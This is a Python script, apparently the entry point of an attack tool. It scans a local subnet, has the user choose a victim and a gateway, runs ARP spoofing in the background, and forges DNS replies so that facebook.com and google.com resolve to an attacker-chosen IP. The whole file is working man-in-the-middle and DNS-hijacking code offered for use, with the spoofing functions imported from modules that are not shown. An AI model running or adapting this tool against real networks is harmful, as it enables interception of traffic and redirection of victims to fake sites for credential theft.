from setup.network_scan import scan_network
from attacks.arp_spoof import start_spoofing
from attacks.dns_spoof import spoof_dns
from scapy.arch import get_if_hwaddr
from scapy.sendrecv import sniff
import threading
import sys

def choose_host(hosts, role = "victim"):
    print(f"\nSelect a {role}:")
    for i, (ip, mac) in enumerate(hosts):
        print(f"{i}: {ip} ({mac})")
    idx = input(f"Enter number [0-{len(hosts)-1}]: ")
    return hosts[int(idx)]

def main():
    print("=== ARP Spoofing Tool ===")
    iface = input("Interface (leave blank for default): ").strip() or None
    subnet = input("IP range to scan (e.g. 192.168.1.0/24): ").strip()

    hosts = scan_network(subnet, iface=iface)

    if len(hosts) < 2:
        print("Error : Not enough devices found.")
        sys.exit(1)

    victim_ip, victim_mac = choose_host(hosts, "victim")
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")

    #Allow the ARP spoofing to run in parallel
    arp_thread = threading.Thread(
        target=start_spoofing,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac)
    )
    arp_thread.daemon = True #To run in the background
    arp_thread.start()

    # prepare DNS spoofing
    spoofed_domains = ["facebook.com", "google.com"]   #example list
    fake_ip = "192.168.1.100"                         #fake server IP
    attacker_mac = get_if_hwaddr(iface)               #needed by spoof_dns

    print(f"\nLaunching DNS spoofing on {iface} for {spoofed_domains} → {fake_ip}")
    #sniff DNS queries and handle them with spoof_dns
    sniff(
        iface=iface,
        filter="udp port 53",
        prn=lambda pkt: spoof_dns(pkt, spoofed_domains, fake_ip, attacker_mac, iface),
        store=False
    )

if __name__ == "__main__":
    main()